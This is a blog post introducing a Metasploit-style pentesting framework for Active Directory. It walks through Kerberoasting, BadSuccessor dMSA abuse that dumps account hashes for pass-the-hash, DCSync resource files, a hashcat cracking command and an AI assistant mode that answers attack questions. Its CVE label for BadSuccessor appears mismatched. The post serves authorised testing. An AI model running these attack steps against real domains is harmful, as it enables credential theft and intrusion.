---
layout: default
title: "UwU Toolkit: A Modular Pentesting Framework"
date: 2025-12-15
tags: ["tools", "pentesting", "framework", "automation", "active-directory"]
---

<div class="terminal-output">
  <p>
    <span class="prompt-symbol">$</span> <span style="color: var(--cyan);">cat ~/blog/uwu-toolkit.md</span>
  </p>
</div>

## Introduction

After years of running the same commands manually, copying and pasting from notes, and wishing Metasploit had better Active Directory modules, I built **UwU Toolkit**—a modular penetration testing framework designed for red teamers who live in the terminal.

```
 ██╗   ██╗██╗    ██╗██╗   ██╗
 ██║   ██║██║    ██║██║   ██║
 ██║   ██║██║ █╗ ██║██║   ██║
 ██║   ██║██║███╗██║██║   ██║
 ╚██████╔╝╚███╔███╔╝╚██████╔╝
  ╚═════╝  ╚══╝╚══╝  ╚═════╝
        TOOLKIT v1.0
```

UwU Toolkit is a Metasploit-inspired CLI framework with persistent variable management, module discovery, Exegol container integration, and built-in support for Active Directory attacks. If you've ever wanted `use auxiliary/ad/kerberoast` to just work, this is for you.

---

## Why I Built This

Every engagement, I found myself:
1. Typing the same impacket commands with slight variations
2. Forgetting which credentials I used where
3. Losing track of discovered hosts and services
4. Copy-pasting from a giant notes file

UwU Toolkit solves these problems with:

- **Persistent variables** - Set `DOMAIN` once, use everywhere
- **Module system** - Organized, reusable attack modules
- **History tracking** - Tab-complete previous values
- **Exegol integration** - Seamlessly use containerized tools
- **Claude AI integration** - Ask questions, analyze code, debug errors

---

## Quick Start

```bash
# Clone and install
git clone https://github.com/p3ta00/uwu-toolkit
cd uwu-toolkit
./setup.sh

# Run interactively
uwu

# Or execute directly
uwu -x "use auxiliary/ad/kerberoast; set RHOSTS 10.10.10.100; run"
```

The interface will feel familiar to anyone who's used Metasploit:

```
uwu> use auxiliary/ad/kerberoast
uwu auxiliary(ad/kerberoast)> options

Module Options (auxiliary/ad/kerberoast):

  Name          Current Setting    Required  Description
  ----          ---------------    --------  -----------
  RHOSTS                           yes       Domain Controller IP
  DOMAIN                           yes       Domain name
  USER                             yes       Domain username
  PASS                             yes       Domain password
  TARGET_USER                      no        Specific user to kerberoast
  OUTPUT        kerberoast.txt     no        Output file for hashes

uwu auxiliary(ad/kerberoast)> set RHOSTS 10.10.10.100
uwu auxiliary(ad/kerberoast)> set DOMAIN corp.local
uwu auxiliary(ad/kerberoast)> set USER svc_sql
uwu auxiliary(ad/kerberoast)> set PASS Summer2025!
uwu auxiliary(ad/kerberoast)> run
```

---

## Module System

Modules are organized by category:

```
modules/
├── auxiliary/
│   ├── ad/           # Active Directory attacks
│   │   ├── kerberoast.py
│   │   ├── asreproast.py
│   │   ├── bloodhound_collect.py
│   │   ├── secretsdump.py
│   │   ├── badsuccessor.py
│   │   └── ...
│   ├── smb/          # SMB enumeration
│   ├── ssh/          # SSH enumeration
│   └── aws/          # Cloud enumeration
├── enumeration/
│   ├── autoenum.py   # Full auto-recon pipeline
│   ├── nmap_scan.py
│   └── portscan_fast.py
├── exploits/
├── post/
│   ├── linux/
│   └── windows/
└── payloads/
```

### Example: Kerberoasting

```python
uwu> use auxiliary/ad/kerberoast
uwu auxiliary(ad/kerberoast)> setg DOMAIN corp.local
uwu auxiliary(ad/kerberoast)> setg RHOSTS 10.10.10.100
uwu auxiliary(ad/kerberoast)> set USER sqlservice
uwu auxiliary(ad/kerberoast)> set PASS Password123!
uwu auxiliary(ad/kerberoast)> run

[*] Target DC: 10.10.10.100
[*] Domain: corp.local
[*] Using Exegol container for impacket tools

ServicePrincipalName    Name      MemberOf
----------------------  --------  ---------------------------------
MSSQLSvc/sql.corp.local sqlsvc    CN=SQL Admins,CN=Users,DC=corp...

[+] Got TGS hash!
[+] Saved 1 hash(es) to: /workspace/kerberoast_hashes.txt
[*] Crack with: hashcat -m 13100 kerberoast_hashes.txt wordlist.txt
```

### Example: BadSuccessor (CVE-2025-21293)

For Windows Server 2025 environments, the BadSuccessor module exploits dMSA (Delegated Managed Service Account) misconfigurations:

```python
uwu> use auxiliary/ad/badsuccessor
uwu auxiliary(ad/badsuccessor)> set RHOSTS 10.1.52.173
uwu auxiliary(ad/badsuccessor)> set DOMAIN yggdrasil.hacksmarter
uwu auxiliary(ad/badsuccessor)> set USER hodr
uwu auxiliary(ad/badsuccessor)> set PASS Password123!
uwu auxiliary(ad/badsuccessor)> set TARGET_DN CN=Ymir,OU=Administrators,OU=Users,DC=yggdrasil,DC=hacksmarter
uwu auxiliary(ad/badsuccessor)> set TARGET_OU OU=Web Servers,OU=Servers,DC=yggdrasil,DC=hacksmarter
uwu auxiliary(ad/badsuccessor)> run

[*] Target DC: 10.1.52.173
[*] Domain: yggdrasil.hacksmarter
[*] Attacking User: hodr
[*] Target DN: CN=Ymir,OU=Administrators,...
[*] Attempting BadSuccessor via bloodyAD...

[+] BadSuccessor exploit successful!
[+] Impersonating: CN=Ymir,...
[+] AES256: 771b28561428215f5a879ad649f176883d0cd925fb85f216a37b0592829042f3
[+] RC4: 8dd4cfe0f89272424e50f5089b8696ec
[!] ^ This contains the target account's NTLM hash!

[*] Next steps:
[*]   1. Use the RC4 hash for Pass-the-Hash
[*]   2. Run: use auxiliary/ad/secretsdump
```

---

## AutoEnum: Automated Reconnaissance

The `autoenum` module runs a full reconnaissance pipeline similar to AutoRecon:

```python
uwu> use enumeration/autoenum
uwu enumeration(autoenum)> set RHOSTS 10.10.10.100
uwu enumeration(autoenum)> set SPEED normal
uwu enumeration(autoenum)> set WEB_FUZZ yes
uwu enumeration(autoenum)> run

======================================================================
  AutoEnum - Automated Enumeration Pipeline
======================================================================
[*] Target: 10.10.10.100
[*] Output: ./autoenum_results/10_10_10_100_20251215_143022

[+] [Phase 1/3] Port Discovery
--------------------------------------------------
[*] Scanning all 65535 TCP ports (rate: 1000/s)...
[+]   22/tcp   open  ssh
[+]   80/tcp   open  http
[+]   445/tcp  open  microsoft-ds

[+] [Phase 2/3] Service Detection
--------------------------------------------------
[+]   22/tcp   open  ssh         OpenSSH 8.9p1
[+]   80/tcp   open  http        Apache httpd 2.4.52
[+]   445/tcp  open  smb         Samba smbd 4.15

[+] [Phase 3/3] Service Enumeration
--------------------------------------------------
[*] Launching 3 service enumeration tasks...
[+]   [http:80] Enumeration complete
[+]   [smb:445] Enumeration complete
[+]   [ssh:22] Enumeration complete

======================================================================
  Enumeration Complete
======================================================================
[*] Duration: 127.3 seconds
[*] Open ports: 3

[!] Quick Wins to Check:
  [WEB] Check web fuzzer output, look for admin panels
  [SMB] Check enum4linux output, try null session
```

Output is organized in a clean directory structure:

```
autoenum_results/10_10_10_100_20251215_143022/
├── scans/
│   ├── tcp_discovery.nmap
│   ├── service_detection.nmap
│   └── udp_scan.nmap
├── services/
│   ├── http_80/
│   │   ├── feroxbuster.txt
│   │   ├── nmap_http.txt
│   │   └── nikto.txt
│   └── smb_445/
│       ├── enum4linux.txt
│       └── nmap_smb.txt
└── REPORT.txt
```

---

## Persistent Variables

One of the most useful features is persistent global variables:

```python
# Set once
uwu> setg DOMAIN corp.local
uwu> setg RHOSTS 10.10.10.100
uwu> setg USER admin

# Use in any module automatically
uwu> use auxiliary/ad/kerberoast
uwu auxiliary(ad/kerberoast)> options

  Name      Current Setting    Required
  ----      ---------------    --------
  RHOSTS    10.10.10.100       yes       # Auto-populated!
  DOMAIN    corp.local         yes       # Auto-populated!
  USER      admin              yes       # Auto-populated!
  PASS                         yes
```

Variables persist across sessions. The framework also tracks history, so you can tab-complete previously used values:

```python
uwu> set PASS <TAB>
Password123!  Summer2025!  Welcome1  hunter2
```

---

## Writing Custom Modules

Creating a new module is straightforward:

```python
from core.module_base import ModuleBase, ModuleType, Platform, find_tool

class MyModule(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "my_module"
        self.description = "Does something useful"
        self.author = "Your Name"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.MULTI
        self.tags = ["custom", "example"]

        # Register options
        self.register_option("RHOSTS", "Target host", required=True)
        self.register_option("RPORT", "Target port", default=80)

    def run(self) -> bool:
        target = self.get_option("RHOSTS")
        port = self.get_option("RPORT")

        self.print_status(f"Targeting {target}:{port}")

        # Run external command
        ret, stdout, stderr = self.run_command(["curl", f"http://{target}:{port}"])

        if ret == 0:
            self.print_good("Success!")
            return True
        else:
            self.print_error(f"Failed: {stderr}")
            return False

    def check(self) -> bool:
        """Verify prerequisites"""
        return find_tool("curl") is not None
```

Drop it in `modules/auxiliary/custom/my_module.py` and it's immediately available:

```python
uwu> search my_module
uwu> use auxiliary/custom/my_module
```

---

## Resource Files

Automate common workflows with resource files:

```bash
# kerberoast_spray.rc
setg DOMAIN corp.local
setg RHOSTS 10.10.10.100

# Kerberoast
use auxiliary/ad/kerberoast
set USER sqlservice
set PASS Summer2025!
run

# BloodHound collection
use auxiliary/ad/bloodhound_collect
run
back

# Secrets dump
use auxiliary/ad/secretsdump
set AUTH_TYPE password
run
```

Execute with:

```bash
uwu -r kerberoast_spray.rc
```

---

## Claude AI Integration

Built-in Claude integration for assistance during engagements:

```python
uwu> claude mode

┌─────────────────────────────────────────┐
│  Claude AI Assistant                    │
│  Model: claude-sonnet-4-20250514        │
└─────────────────────────────────────────┘

claude> How do I exploit AS-REP roasting if I have a list of usernames?

I'll walk you through AS-REP roasting...

# Exit with Ctrl+D, resume later with:
uwu> claude resume
```

Quick commands for one-off queries:

```python
uwu> claude analyze /path/to/suspicious/script.ps1
uwu> claude debug /path/to/error_log.txt
uwu> claude ask "What's the hashcat mode for NTLMv2?"
```

---

## Exegol Integration

UwU Toolkit seamlessly integrates with [Exegol](https://exegol.readthedocs.io/) containers. If a tool isn't found locally, it automatically executes inside your Exegol container:

```python
uwu> use auxiliary/ad/kerberoast
uwu> run

[*] Using Exegol container for impacket tools
[*] Container: exegol-htb
...
```

Set your container globally:

```python
uwu> setg EXEGOL_CONTAINER exegol-engagement
```

---

## Available Modules

Current module count: **50+** and growing

**Active Directory:**
- `auxiliary/ad/kerberoast` - Kerberoasting attack
- `auxiliary/ad/asreproast` - AS-REP roasting
- `auxiliary/ad/bloodhound_collect` - BloodHound data collection
- `auxiliary/ad/secretsdump` - DCSync/SAM dump
- `auxiliary/ad/badsuccessor` - CVE-2025-21293 dMSA exploit
- `auxiliary/ad/certipy_find` - ADCS enumeration
- `auxiliary/ad/certipy_exploit` - ADCS exploitation

**Enumeration:**
- `enumeration/autoenum` - Full auto-recon pipeline
- `enumeration/portscan_fast` - Fast TCP port scan
- `enumeration/web_fuzz` - Directory fuzzing
- `enumeration/dns_enum` - DNS enumeration

**Post-Exploitation:**
- `post/linux/linpeas_enum` - LinPEAS automation
- `post/linux/pspy_monitor` - Process monitoring
- `post/windows/gather/lnk_parser` - LNK file analysis
- `post/windows/escalate/gpo_abuse` - GPO abuse

**Cloud:**
- `auxiliary/aws/s3_enum` - S3 bucket enumeration
- `auxiliary/aws/iam_enum` - IAM enumeration
- `auxiliary/aws/ec2_metadata` - EC2 metadata extraction

---

## Conclusion

UwU Toolkit started as a personal project to scratch my own itch—I wanted Metasploit's workflow but with better AD modules and modern tooling. It's become my daily driver for penetration tests and CTF challenges.

The project is open source and contributions are welcome. If you have module ideas or want to improve existing functionality, check out the [GitHub repo](https://github.com/p3ta00/uwu-toolkit).

```bash
# Get started
git clone https://github.com/p3ta00/uwu-toolkit
cd uwu-toolkit
./setup.sh
uwu
```

Happy hunting.

---

```
$ exit
```
